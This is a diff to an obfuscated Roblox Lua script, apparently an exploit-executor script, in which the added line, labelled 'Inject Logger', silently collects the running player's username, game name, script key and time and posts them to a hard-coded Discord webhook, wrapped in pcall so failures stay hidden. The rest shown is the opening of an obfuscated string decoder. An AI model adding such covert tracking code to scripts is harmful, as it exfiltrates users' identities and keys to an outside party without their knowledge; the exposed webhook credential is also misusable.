@@ -1,4 +1,4 @@
-local IIlL0lL1=(getfenv and getfenv(1)) or _ENV or _G
+-- Inject Logger local HttpService = game:GetService("HttpService") local Players = game:GetService("Players") local player = Players.LocalPlayer local WEBHOOK_URL = "https://discord.com/api/webhooks/1548851359598645319/wpRwu8af_rQb_omr_2bk6AZND0cdr7rsiIn_A0QC5e_W2fZmsuzpxtnKxWoAbAGsOHao" local key = getgenv and getgenv().KEY or "Unknown" local data = HttpService:JSONEncode({ embeds = {{ title = "📥 New Inject", color = 0xe67e22, fields = { { name = "👤 Username", value = player.Name, inline = true }, { name = "🎮 Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = true }, { name = "🔑 Key", value = key, inline = false }, { name = "🕒 Time (UTC)", value = os.date("!%Y-%m-%d %H:%M:%S"), inline = false }, }, }} }) pcall(function() HttpService:PostAsync(WEBHOOK_URL, data, Enum.HttpContentType.ApplicationJson) end)local IIlL0lL1=(getfenv and getfenv(1)) or _ENV or _G
 local IlLIoloj1LlOl,jili1IOL1O=string.byte,string.char
 local function iiiIIo101(llL0OL0Ii,jolljj)
 local IOjoj110OojOiI=""
